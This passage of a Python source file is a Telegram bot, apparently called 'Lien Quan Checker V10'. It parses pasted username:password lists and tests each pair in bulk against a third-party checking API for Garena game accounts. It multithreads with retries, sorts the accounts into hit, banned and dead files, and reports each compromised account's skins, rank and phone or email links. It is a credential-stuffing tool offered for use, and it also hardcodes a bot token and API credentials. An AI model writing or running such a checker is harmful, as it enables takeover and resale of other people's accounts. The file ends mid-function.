import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import struct
import math
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install",
                                   package_name, "--no-cache-dir"])
        except:
            pass


for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

import telebot
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler

# ========== AUDIO ==========
CUSTOM_AUDIO_PATH = "custom_audio.wav"
CUSTOM_AUDIO_DATA = None
AUDIO_LOCK = threading.Lock()


class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.dashboard().encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "alive",
                "checking": checking,
                "stats": stats,
                "admin": ADMIN_USERNAME,
                "version": "10.0-full"
            }).encode('utf-8'))
        elif self.path in ('/audio', '/audio.mp3'):
            self.send_response(200)
            self.send_header('Content-type', 'audio/wav')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(self.get_audio())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")

    def get_audio(self):
        with AUDIO_LOCK:
            if CUSTOM_AUDIO_DATA:
                return CUSTOM_AUDIO_DATA
        return self.default_audio()

    def default_audio(self):
        try:
            sr = 44100; dur = 30.0; n = int(sr * dur)
            buf = bytearray()
            for i in range(n):
                t = i / sr
                v = int(32767 * 0.3 * (
                    math.sin(2 * math.pi * 440 * t) * 0.4 +
                    math.sin(2 * math.pi * 554 * t) * 0.3 +
                    math.sin(2 * math.pi * 659 * t) * 0.2 +
                    math.sin(2 * math.pi * 880 * t) * 0.15 +
                    math.sin(2 * math.pi * 220 * t) * 0.2))
                buf += struct.pack('<h', v)
            ds = len(buf)
            h = b'RIFF' + struct.pack('<I', 36 + ds) + b'WAVE'
            h += b'fmt ' + struct.pack('<IHHIIHH', 16, 1, 1, sr, sr * 2, 2, 16)
            h += b'data' + struct.pack('<I', ds)
            return h + bytes(buf)
        except Exception:
            return b''

    def dashboard(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        up = time.time() - start_time if 'start_time' in globals() else 0
        up_str = time.strftime("%H:%M:%S", time.gmtime(up))
        bc = "#ff9800" if checking else "#4caf50"
        stt = "Dang check" if checking else "San sang"
        return f"""<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>LIEN QUAN CHECKER V10</title><style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:monospace;background:#0a0a0a;color:#0f0;
min-height:100vh;overflow-x:hidden}}
#mx{{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.15}}
.w{{position:relative;z-index:1;max-width:900px;margin:20px auto;padding:20px}}
.h{{background:rgba(0,0,0,0.85);border:2px solid #0f0;border-radius:18px;
padding:28px;text-align:center;box-shadow:0 0 50px rgba(0,255,0,0.15)}}
.t{{font-size:2.4em;font-weight:900;color:#0f0;text-shadow:0 0 20px rgba(0,255,0,0.8)}}
.s{{color:#8f8;font-size:0.9em;letter-spacing:3px;margin-top:6px}}
.b{{display:inline-block;padding:10px 25px;border-radius:50px;background:{bc};
color:#fff;font-weight:700;margin-top:14px}}
.g{{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:20px 0}}
.c{{background:linear-gradient(145deg,rgba(0,255,0,0.05),rgba(0,0,0,0.8));
border:1px solid rgba(0,255,0,0.2);border-radius:14px;padding:18px;text-align:center}}
.v{{font-size:2.2em;font-weight:900;color:#0f0}}
.l{{font-size:0.7em;color:#8a8;text-transform:uppercase;margin-top:6px}}
.v.b{{color:#f63}} .v.c{{color:#0cf}} .v.t{{color:#f0f;font-size:1.1em}}
@media(max-width:768px){{.t{{font-size:1.7em}}.g{{grid-template-columns:repeat(2,1fr)}}}}
</style></head><body><canvas id="mx"></canvas><div class="w"><div class="h">
<div class="t">ð® LIEN QUAN CHECKER</div>
<div class="s">V10.0 - FULL</div>
<div class="s">Admin: @{ADMIN_USERNAME}</div>
<div class="b">{stt}</div></div>
<div class="g">
<div class="c"><div class="v">{stats.get('hits',0)}</div><div class="l">â Hits</div></div>
<div class="c"><div class="v b">{stats.get('banned',0)}</div><div class="l">ð« Banned</div></div>
<div class="c"><div class="v c">{stats.get('clean',0)}</div><div class="l">ð¢ Clean</div></div>
<div class="c"><div class="v t">{now}</div><div class="l">ð Time</div></div>
</div></div><audio loop autoplay><source src="/audio"></audio>
<script>const c=document.getElementById('mx'),x=c.getContext('2d');
c.width=innerWidth;c.height=innerHeight;const ch='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
const f=14,co=Math.ceil(c.width/f),d=[];
for(let i=0;i<co;i++)d[i]=Math.random()*-100;
setInterval(()=>{{x.fillStyle='rgba(0,0,0,0.05)';x.fillRect(0,0,c.width,c.height);
for(let i=0;i<d.length;i++){{const t=ch[Math.floor(Math.random()*ch.length)];
x.fillStyle=Math.random()>0.92?'#fff':'#0f0';x.font=f+'px monospace';
x.fillText(t,i*f,d[i]*f);if(d[i]*f>c.height&&Math.random()>0.975)d[i]=0;d[i]++;}}}},50);
addEventListener('resize',()=>{{c.width=innerWidth;c.height=innerHeight}});
const au=document.querySelector('audio');au.volume=0.25;
setInterval(()=>{{if(au.paused)au.play().catch(()=>{{}})}},5000);
setInterval(()=>{{fetch('/stats').then(r=>r.json()).then(d=>{{
document.querySelectorAll('.v')[0].textContent=d.stats.hits||0;
document.querySelectorAll('.v')[1].textContent=d.stats.banned||0;
document.querySelectorAll('.v')[2].textContent=d.stats.clean||0;
const b=document.querySelector('.b');b.textContent=d.checking?'ð´ Dang check':'ð¢ San sang';
b.style.background=d.checking?'#ff9800':'#4caf50';}}).catch(()=>{{}});}},5000);
</script></body></html>"""

    def log_message(self, *args):
        pass


def start_render_server():
    global start_time, CUSTOM_AUDIO_DATA
    start_time = time.time()
    if os.path.exists(CUSTOM_AUDIO_PATH):
        try:
            with open(CUSTOM_AUDIO_PATH, 'rb') as f:
                CUSTOM_AUDIO_DATA = f.read()
        except:
            pass
    try:
        port = int(os.environ.get("PORT", 10000))
        srv = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Web port {port}")
        srv.serve_forever()
    except Exception as e:
        print(f"[!] Web loi: {e}")


threading.Thread(target=start_render_server, daemon=True).start()

# ========== CONFIG ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEewaS0Vd8VjIlB941QXwDzZYtnTwQYBY4"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_ID = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"

API_BASE = "https://purchase.nhatminh301.com"
API_USERNAME = "api_7567975053"
API_PASSWORD = "iNH0Tz1daeia"

DEFAULT_TIMEOUT = 45
DEFAULT_RETRIES = 4
DEFAULT_DELAY = 0.25

CHECKMULTI_THREADS = 40
CHECKMULTI_DELAY = 0.4
CHECKMULTI_BATCH_SIZE = 15
CHECKMULTI_BATCH_DELAY = 2.0
CHECKMULTI_MAX_RETRY = 2

CACHE_TTL = 300
CACHE_MAX_SIZE = 5000

RETRY_STATUS = {429, 500, 502, 503, 504, 408}
BACKOFF_BASE = 1.5
BACKOFF_MAX = 30

OUTPUT_LOC = "loc_accounts.txt"
CLEAN_OUTPUT_FILE = "clean_accounts.txt"
BANNED_OUTPUT_FILE = "banned_accounts.txt"
HIT_OUTPUT_FILE = "hit_accounts.txt"
DEAD_OUTPUT_FILE = "dead_accounts.txt"
ERROR_OUTPUT_FILE = "error_accounts.txt"
MAX_MESSAGE_LENGTH = 4000

SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan",
        "icon": "ð®",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    }
}

checking = False
stop_event = threading.Event()
pending_accounts = {}
all_queued_accounts = {}
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0,
         "errors": 0, "banned": 0, "clean": 0,
         "retries": 0, "cache_hits": 0, "removed": 0, "start_time": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
banned_lock = threading.Lock()

rate_lock = threading.Lock()
last_request_time = 0
start_time = time.time()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")


class TTLCache:
    def __init__(self, ttl=CACHE_TTL, max_size=CACHE_MAX_SIZE):
        self.ttl = ttl
        self.max_size = max_size
        self.data = {}
        self.lock = threading.Lock()

    def get(self, key):
        with self.lock:
            e = self.data.get(key)
            if not e:
                return None
            v, ts = e
            if time.time() - ts > self.ttl:
                del self.data[key]
                return None
            return v

    def set(self, key, value):
        with self.lock:
            if len(self.data) >= self.max_size:
                old = sorted(self.data.items(), key=lambda x: x[1][1])[:self.max_size // 4]
                for k, _ in old:
                    self.data.pop(k, None)
            self.data[key] = (value, time.time())

    def clear(self):
        with self.lock:
            self.data.clear()


api_cache = TTLCache()

# ========== BAN DETECTION ==========
BAN_KEYWORDS = [
    "banned", "ban", "bi khoa", "bá» khÃ³a", "khoa", "khÃ³a",
    "blocked", "block", "suspended", "suspend", "locked", "lock",
    "vi pham", "vi pháº¡m", "violation", "vipham",
    "khoa tai khoan", "khÃ³a tÃ i khoáº£n", "account locked",
    "account banned", "account suspended", "permanently banned",
    "tam khoa", "táº¡m khÃ³a", "temporary ban", "permanent ban",
    "vinh vien", "vÄ©nh viá»n", "permanent", "dÃ­nh sÄt", "dinh sdt",
    "dÃ­nh fb", "dinh fb"
]


def is_account_banned(result_data):
    if not isinstance(result_data, dict):
        return False, "unknown"

    for f in ["banned", "ban", "aov_banned", "is_banned", "isBanned",
              "ban_status", "account_banned", "account_status",
              "status_account", "tinh_trang", "trang_thai", "status",
              "locked", "is_locked", "isLocked", "suspended",
              "blocked", "is_blocked", "disabled"]:
        if f in result_data:
            v = result_data[f]
            if isinstance(v, bool):
                return (True, f"{f}=True") if v else (False, f"{f}=False")
            if isinstance(v, (int, float)):
                if v == 1:
                    return True, f"{f}=1"
                if v == 0:
                    return False, f"{f}=0"
            if isinstance(v, str):
                vl = v.lower().strip()
                if vl in ["yes", "true", "1", "banned", "ban", "blocked",
                          "suspended", "locked", "disabled", "forbidden"]:
                    return True, f"{f}={v}"
                if vl in ["no", "false", "0", "active", "normal", "ok",
                          "clean", "unbanned", "none", "null", ""]:
                    return False, f"{f}={v}"
                for kw in BAN_KEYWORDS:
                    if kw in vl:
                        if any(n in vl for n in ["khong", "khÃ´ng", "not ", "un", "no "]):
                            continue
                        return True, f"{f} chua '{kw}'"

    for f in ["ban_reason", "ly_do_ban", "lydohan", "reason_ban",
              "ban_message", "ban_note", "ly_do_khoa"]:
        if f in result_data and result_data[f]:
            r = str(result_data[f]).strip()
            if r and r.lower() not in ["none", "null", "", "n/a", "no"]:
                return True, f"{f}={r}"

    for f in ["ban_until", "ban_expires", "ban_expire", "expires_ban",
              "thoi_gian_ban", "khoa_den", "ban_end"]:
        if f in result_data and result_data[f]:
            v = str(result_data[f]).strip()
            if v and v.lower() not in ["none", "null", "", "n/a", "no", "0"]:
                if v not in ["0000-00-00", "1970-01-01", "0000-00-00 00:00:00"]:
                    return True, f"{f}={v}"

    for f in ["message", "msg", "error", "error_message", "description", "desc"]:
        if f in result_data and result_data[f]:
            m = str(result_data[f]).lower()
            for kw in BAN_KEYWORDS:
                if kw in m:
                    if any(n in m for n in ["khong bi", "khÃ´ng bá»", "not banned",
                                             "chua bi", "chÆ°a bá»", "unbanned",
                                             "khong khoa", "khÃ´ng khÃ³a"]):
                        continue
                    return True, f"{f} chua '{kw}'"

    for f in ["status", "account_status", "trang_thai", "state"]:
        if f in result_data and result_data[f]:
            st = str(result_data[f]).lower().strip()
            if st in ["banned", "ban", "blocked", "suspended", "locked",
                      "disabled", "forbidden", "inactive"]:
                return True, f"{f}={st}"

    return False, "clean"


def save_to_file(filepath, username, password, extra=""):
    with banned_lock:
        try:
            with open(filepath, 'a', encoding='utf-8') as f:
                if extra:
                    f.write(f"{username}:{password}|{extra}\n")
                else:
                    f.write(f"{username}:{password}\n")
        except Exception as e:
            print(f"[!] Loi luu {filepath}: {e}")


def clear_output_files():
    for fn in [CLEAN_OUTPUT_FILE, BANNED_OUTPUT_FILE, HIT_OUTPUT_FILE,
               DEAD_OUTPUT_FILE, ERROR_OUTPUT_FILE]:
        try:
            if os.path.exists(fn):
                os.remove(fn)
        except:
            pass


# ========== FORMAT ==========
def _is_empty(v):
    if v is None or v == "" or v == {} or v == []:
        return True
    if isinstance(v, (int, float)) and v == 0:
        return True
    if isinstance(v, str) and v in ["0", "00", "000", "N/A"]:
        return True
    return False


def format_hit_info(username, password, service, result_data):
    sep = "âââââââââ â HIT âââââââââ"
    is_banned, ban_reason = is_account_banned(result_data)
    lines = [sep, ""]
    lines.append(f"ð <code>{username}:{password}</code>")

    if not isinstance(result_data, dict):
        lines.append("âââââââââââââââââââââââââ")
        return "\n".join(lines)

    def g(*keys):
        for k in keys:
            if k in result_data and not _is_empty(result_data[k]):
                return result_data[k]
        return None

    def fb(v):
        if isinstance(v, bool):
            return "Yes" if v else "No"
        if isinstance(v, str):
            vl = v.lower().strip()
            if vl in ["true", "yes", "1"]:
                return "Yes"
            if vl in ["false", "no", "0"]:
                return "No"
        return v

    def fs(v):
        return fix_encoding(v) if isinstance(v, str) else v

    def fl(v):
        if isinstance(v, (list, tuple)):
            return ", ".join(fix_encoding(str(i)) for i in v)
        return fix_encoding(str(v))

    mapping = [
        ("ð¤ UID", ["uid", "id"], None),
        ("ð¤ Nickname", ["nickname", "aov_name", "name"], None),
        ("ð Region", ["region", "server"], None),
        ("ð² SÃ²", ["so", "shells"], None),
        ("ð° Náº¡p sÃ²", ["nap_so"], None),
        ("ð© EMAIL", ["email_verified", "email"], "bool"),
        ("ð± SÄT", ["mobile_bound", "phone", "sdt"], "sdt"),
        ("ð¡ PASS", ["password_set"], "bool"),
        ("ð FB", ["fb_linked", "fb"], "fb"),
        ("â° Login cuá»i", ["last_login"], None),
        ("ð Táº¡o GR", ["garena_created", "created_at"], None),
        ("ð¥ NAME", ["aov_name"], None),
        ("ð RANK", ["aov_rank"], None),
        ("â¨ LEVEL", ["aov_level"], None),
        ("ð NgÃ y táº¡o TK", ["ngay_tao_tk"], None),
        ("ð SKIN", ["aov_total_skins"], None),
        ("ðª HERO", ["aov_total_champs", "aov_total_heroes"], None),
        ("â¡ï¸ QH", ["aov_total_relationships"], None),
        ("ð CCCD", ["cccd"], "bool"),
        ("ð¡ Authen", ["authen"], "bool"),
    ]

    ban_val = g("banned", "ban", "aov_banned")
    ban_until = g("ban_until", "ban_expires")

    for label, keys, kind in mapping:
        v = g(*keys)
        if v is None:
            continue
        if kind == "bool":
            lines.append(f"{label}: {fb(v)}")
        elif kind == "sdt":
            if isinstance(v, str) and "[" in v:
                lines.append(f"{label}: {fs(v)}")
            else:
                lines.append(f"{label}: {fb(v)}")
        elif kind == "fb":
            if isinstance(v, str) and "[" in v:
                lines.append(f"{label}: {fs(v).upper()}")
            elif isinstance(v, str) and v.upper() in ["YES", "NO"]:
                lines.append(f"{label}: {v.upper()}")
            else:
                lines.append(f"{label}: {fb(v)}")
        else:
            lines.append(f"{label}: {fs(v)}")

    if ban_val is not None or ban_until is not None:
        bv = ban_val
        if isinstance(bv, bool):
            bv = "YES" if bv else "NO"
        elif isinstance(bv, str):
            bv = bv.upper()
        if ban_until and bv == "YES":
            lines.append(f"ð« BAND: YES [Äáº¿n {fs(ban_until)}]")
        elif bv:
            lines.append(f"ð« BAND: {bv}")

    ss_list = g("aov_ss_list")
    ss_cnt = g("aov_ss")
    if ss_list:
        lines.append(f"â¨ SS: {ss_cnt or len(ss_list)} [{fl(ss_list)}]")
    elif ss_cnt is not None:
        lines.append(f"â¨ SS: {fs(ss_cnt)}")

    sss_list = g("aov_sss_list")
    sss_cnt = g("aov_sss")
    if sss_list:
        lines.append(f"ð¥ SSS: {sss_cnt or len(sss_list)} [{fl(sss_list)}]")
    elif sss_cnt is not None:
        lines.append(f"ð¥ SSS: {fs(sss_cnt)}")

    anime_list = g("aov_anime_list")
    anime_cnt = g("aov_anime")
    if anime_list:
        lines.append(f"ð¥ Anime: {anime_cnt or len(anime_list)} [{fl(anime_list)}]")
    elif anime_cnt is not None:
        lines.append(f"ð¥ Anime: {fs(anime_cnt)}")

    other_list = g("aov_other_list")
    other_cnt = g("aov_other")
    if other_list:
        lines.append(f"ð² Other: {other_cnt or len(other_list)} [{fl(other_list)}]")
    elif other_cnt is not None:
        lines.append(f"ð² Other: {fs(other_cnt)}")

    tt = g("tinh_trang", "status_account")
    if tt is not None:
        lines.append("")
        lines.append(f"ð TÃ¬nh Tráº¡ng: {fs(tt)}")

    lines.append("âââââââââââââââââââââââââ")
    return "\n".join(lines)


# ========== UTILS ==========
def rate_limit(delay=DEFAULT_DELAY):
    global last_request_time
    with rate_lock:
        now = time.time()
        since = now - last_request_time
        if since < delay:
            time.sleep(delay - since)
        last_request_time = time.time()


def fix_encoding(text):
    if not isinstance(text, str):
        return text
    r = {'ÃÂ¡': 'Ã¡', 'Ã ': 'Ã ', 'Ã¡ÂºÂ£': 'áº£', 'ÃÂ£': 'Ã£', 'Ã¡ÂºÂ¡': 'áº¡',
         'Ã': 'Ä', 'ÃÂ°': 'Æ°', 'ÃÂ¡': 'Æ¡', 'ÃÂ´': 'Ã´', 'ÃÂ¢': 'Ã¢',
         'ÃÆ': 'Ä', 'ÃÂª': 'Ãª', 'ÃÂ­': 'Ã­', 'ÃÂ¬': 'Ã¬', 'Ã¡Â»â¹': 'á»',
         'Ã¡Â»â°': 'á»', 'ÃÂ©': 'Ä©', 'ÃÂ³': 'Ã³', 'ÃÂ²': 'Ã²', 'ÃÂº': 'Ãº',
         'ÃÂ¹': 'Ã¹', 'ÃÂ½': 'Ã½', 'Ã¡Â»Â³': 'á»³', 'Ã¡Â»Â·': 'á»·', 'Ã¡Â»Âµ': 'á»µ'}
    for o, n in r.items():
        text = text.replace(o, n)
    if any(c in text for c in ['Ã', 'Ã', 'Ã', 'Ã¡Â»', 'Ã¡Âº', 'ÃÂ©', 'ÃÂ©']):
        try:
            fx = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
            if fx != text and len(fx) > 0:
                text = fx
        except:
            pass
    return text


def is_user_member(user_id):
    try:
        cm = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        return cm.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"[!] Loi member: {e}")
        return False


def check_membership(message):
    if is_user_member(message.from_user.id):
        return True
    mk = telebot.types.InlineKeyboardMarkup()
    mk.add(telebot.types.InlineKeyboardButton(
        text="ð¢ THAM GIA KENH", url=REQUIRED_CHANNEL_URL))
    mk.add(telebot.types.InlineKeyboardButton(
        text="â TOI DA THAM GIA", callback_data="check_join"))
    safe_send_message(message.chat.id, f"""
ð <b>CHUA THAM GIA KENH!</b>

ð¢ Vui long tham gia:
ð <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>

Sau do bam nut xac nhan!
""")
    try:
        bot.send_message(message.chat.id, "ð Xac nhan:", reply_markup=mk)
    except:
        pass
    return False


@bot.callback_query_handler(func=lambda c: c.data == "check_join")
def cb_check_join(call):
    if is_user_member(call.from_user.id):
        bot.answer_callback_query(call.id, "â OK!")
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        safe_send_message(call.message.chat.id,
                          "â <b>XAC NHAN THANH CONG!</b>\n\n/start de bat dau.")
    else:
        bot.answer_callback_query(call.id, "â Chua tham gia!", show_alert=True)


def safe_send_message(chat_id, text, parse_mode="HTML"):
    if not text:
        return
    text = fix_encoding(text)
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        cur = ""
        for ln in text.split('\n'):
            if len(cur) + len(ln) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(cur)
                cur = ln + '\n'
            else:
                cur += ln + '\n'
        if cur:
            parts.append(cur)
        for p in parts:
            for attempt in range(3):
                try:
                    bot.send_message(chat_id, p.strip(), parse_mode=parse_mode)
                    time.sleep(0.15)
                    break
                except Exception as e:
                    print(f"[!] Send part attempt {attempt+1}: {e}")
                    time.sleep(1)
    else:
        for attempt in range(3):
            try:
                bot.send_message(chat_id, text, parse_mode=parse_mode)
                break
            except Exception as e:
                print(f"[!] Send attempt {attempt+1}: {e}")
                time.sleep(1)
                if attempt == 2:
                    try:
                        bot.send_message(chat_id, text)
                    except:
                        pass


# ========== LOC TAI KHOAN ==========
def is_time_value(value):
    if not value:
        return False
    value = str(value).strip()
    pats = [
        r'^\d{1,2}:\d{2}(:\d{2})?$',
        r'^\d{1,2}:\d{2}(:\d{2})?\s*(AM|PM|am|pm)$',
        r'^\d{1,2}\.\d{2}(\.\d{2})?$',
        r'^\d{1,2}-\d{2}(-\d{2})?$',
        r'^\d{1,2}/\d{2}(/\d{2,4})?$',
        r'^\d{4}-\d{2}-\d{2}$',
        r'^\d{4}/\d{2}/\d{2}$',
        r'^\d{2}-\d{2}-\d{4}$',
        r'^\d{2}/\d{2}/\d{4}$',
        r'^\d{1,2}h\d{2}(p\d{2})?$',
        r'^\d{1,2}giá»\d{2}$',
        r'^\d{1,2}:\d{2}:\d{2}\.\d+$',
        r'^\d+:\d+$',
        r'^\d+\.\d+$',
        r'^\d+-\d+$',
        r'^\d{10,13}$',
        r'^\d{1,2}\s*(AM|PM|am|pm)$',
    ]
    for p in pats:
        if re.match(p, value, re.IGNORECASE):
            return True
    return False


def is_valid_account(user, pwd):
    if len(user) < 2 or len(pwd) < 1:
        return False
    if len(user) > 80 or len(pwd) > 100:
        return False
    if is_time_value(user) or is_time_value(pwd):
        return False
    if re.match(r'^\d+$', user) or re.match(r'^\d+$', pwd):
        return False
    ul = user.lower()
    for k in ['time', 'date', 'ngay', 'thoi_gian', 'thoigian', 'gio',
              'phut', 'giay', 'timestamp', 'datetime', 'created', 'login',
              'session', 'expires', 'expire', 'valid', 'http', 'https',
              'www', 'com', 'net', 'org', 'shop', 'share', 'final', 'name',
              'level', 'rank', 'status', 'email', 'phone', 'sdt', 'cccd',
              'fb', 'ban', 'ss', 'sss', 'anime', 'other', 'am', 'pm',
              'utc', 'gmt']:
        if k in ul:
            return False
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
        return False
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
        return False
    return True


def loc_tk_mk_only(content):
    accounts = []
    seen = set()
    st = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    if not content:
        return accounts, st
    pc = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    pp = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    lines = content.split('\n')
    st["total"] = len(lines)
    for ln in lines:
        ln = ln.strip()
        if not ln:
            continue
        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', ln):
            continue
        if re.match(r'^\d+$', ln):
            continue
        ms = re.findall(pc, ln) or re.findall(pp, ln)
        for u, p in ms:
            if is_time_value(u) or is_time_value(p):
                continue
            if is_valid_account(u, p):
                k = f"{u}:{p}"
                if k not in seen:
                    seen.add(k)
                    accounts.append((u, p))
                    st["valid"] += 1
                else:
                    st["duplicate"] += 1
            else:
                st["invalid"] += 1
    if not accounts:
        ms = re.findall(pc, content) or re.findall(pp, content)
        for u, p in ms:
            if is_time_value(u) or is_time_value(p):
                continue
            if is_valid_account(u, p):
                k = f"{u}:{p}"
                if k not in seen:
                    seen.add(k)
                    accounts.append((u, p))
                    st["valid"] += 1
                else:
                    st["duplicate"] += 1
            else:
                st["invalid"] += 1
    return accounts, st


def save_loc_file(accounts):
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for u, p in accounts:
                f.write(f"{u}:{p}\n")


def load_queued_accounts(chat_id):
    if chat_id in all_queued_accounts and all_queued_accounts[chat_id]:
        return all_queued_accounts[chat_id]
    if os.path.exists(OUTPUT_LOC):
        try:
            with open(OUTPUT_LOC, 'r', encoding='utf-8') as f:
                content = f.read()
            accs, _ = loc_tk_mk_only(content.replace('|', ':'))
            if accs:
                all_queued_accounts[chat_id] = accs
                return accs
        except Exception as e:
            print(f"[!] Loi load queued: {e}")
    return []


# ========== API ==========
def check_account_api(username, password, service, use_delay=True, max_retry=None):
    if use_delay:
        rate_limit(DEFAULT_DELAY)

    ck = f"{username}:{password}:{service}"
    cached = api_cache.get(ck)
    if cached is not None:
        with stats_lock:
            stats["cache_hits"] = stats.get("cache_hits", 0) + 1
        return cached

    si = SERVICE_ROUTES.get(service, {})
    url = f"{API_BASE}{si.get('route', '/api/lienquan')}"
    pn = si.get("params", ["tk", "mk"])
    ep = si.get("extra_params", {})

    params = {"username": API_USERNAME, "password": API_PASSWORD}
    if len(pn) >= 2:
        params[pn[0]] = username
        params[pn[1]] = password
    for k, v in ep.items():
        if v:
            params[k] = v

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

    retries = max_retry if max_retry is not None else DEFAULT_RETRIES

    for attempt in range(retries):
        try:
            r = requests.get(url, params=params, headers=headers,
                             timeout=DEFAULT_TIMEOUT)
            if r.status_code == 200:
                result = parse_api_response(r)
                api_cache.set(ck, result)
                return result
            if r.status_code in RETRY_STATUS:
                with stats_lock:
                    stats["retries"] = stats.get("retries", 0) + 1
                w = min(BACKOFF_BASE ** attempt, BACKOFF_MAX)
                if r.status_code == 429:
                    try:
                        w = max(w, int(r.headers.get("Retry-After", w)))
                    except:
                        pass
                time.sleep(w)
                continue
            if r.status_code in (401, 403):
                rs = {"result": "error", "_error": f"HTTP {r.status_code}"}
                api_cache.set(ck, rs)
                return rs
            time.sleep(BACKOFF_BASE ** attempt)
            continue
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            with stats_lock:
                stats["retries"] = stats.get("retries", 0) + 1
            if attempt < retries - 1:
                time.sleep(min(BACKOFF_BASE ** attempt, BACKOFF_MAX))
                continue
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
                continue

    rs = {"result": "error", "_error": "All retries failed"}
    api_cache.set(ck, rs)
    return rs


def parse_api_response(r):
    try:
        rd = r.json()
        if isinstance(rd, dict):
            for k, v in list(rd.items()):
                if isinstance(v, str):
                    rd[k] = fix_encoding(v)
                elif isinstance(v, list):
                    rd[k] = [fix_encoding(i) if isinstance(i, str) else i for i in v]
                elif isinstance(v, dict):
                    for sk, sv in list(v.items()):
                        if isinstance(sv, str):
                            v[sk] = fix_encoding(sv)

            hit = False
            sv = rd.get("status")
            if sv is not None:
                if sv in [True, "true", 1, "1", "True", "TRUE",
                          "success", "Success", "SUCCESS", "HIT", "hit"]:
                    hit = True
                elif sv in [False, "false", 0, "0", "False", "FALSE",
                            "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
                    hit = False
            su = rd.get("success")
            if not hit and su is not None:
                if su in [True, "true", 1, "1", "True", "TRUE"]:
                    hit = True
            rv = rd.get("result")
            if rv is not None:
                rs = str(rv).lower()
                if rs in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                    hit = True
                elif rs in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
                    hit = False
            mv = rd.get("message", "")
            if mv:
                ml = str(mv).lower()
                if any(w in ml for w in ["thanh cong", "success", "valid",
                                          "hit", "dung", "live", "ok"]):
                    hit = True
                elif any(w in ml for w in ["that bai", "fail", "invalid",
                                            "dead", "sai", "khong dung",
                                            "die", "error"]):
                    hit = False
            dv = rd.get("data")
            if dv is not None and isinstance(dv, (dict, list, str)) and dv:
                hit = True
            for f in ["uid", "id", "name", "nickname", "account", "info",
                      "user", "player", "level", "rank", "email", "phone",
                      "sdt", "aov_name", "shells"]:
                if f in rd and rd[f] not in [None, "", 0, "0"]:
                    hit = True
                    break
            rd["result"] = "hit" if hit else "dead"
            return rd
        return {"result": "unknown"}
    except json.JSONDecodeError:
        tl = r.text.lower()
        if any(w in tl for w in ["success", "ok", "true", "hit", "valid", "live"]):
            return {"result": "hit"}
        if any(w in tl for w in ["fail", "false", "dead", "invalid", "error", "die"]):
            return {"result": "dead"}
        return {"result": "unknown"}
    except Exception:
        return {"result": "error", "_error": "parse failed"}


# ========== CHECK ==========
def check_single(chat_id, username, password, service="lienquan"):
    safe_send_message(chat_id,
                      f"ð Dang check <code>{username}:{password}</code>...")
    r = check_account_api(username, password, service, use_delay=False)
    rt = r.get("result", "unknown")
    if rt == "hit":
        is_b, reason = is_account_banned(r)
        if is_b:
            save_to_file(BANNED_OUTPUT_FILE, username, password,
                         f"{service}|{reason}")
